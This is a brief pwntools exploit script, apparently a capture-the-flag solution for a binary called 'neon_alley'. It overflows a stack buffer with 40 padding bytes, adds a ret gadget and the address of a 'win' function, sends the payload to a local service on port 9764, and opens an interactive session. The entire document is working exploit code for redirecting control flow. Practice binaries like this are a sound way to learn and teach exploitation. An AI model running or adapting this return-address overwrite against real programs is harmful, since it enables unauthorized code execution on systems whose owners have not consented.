from pwn import *


context.binary = elf = ELF("./neon_alley")

win = elf.symbols["win"]
ret = 0x401016

pay = b"A"*40 + p64(ret) + p64(win)

#p = elf.process()
p = remote("localhost" , 9764)

p.sendline(pay)
p.interactive()
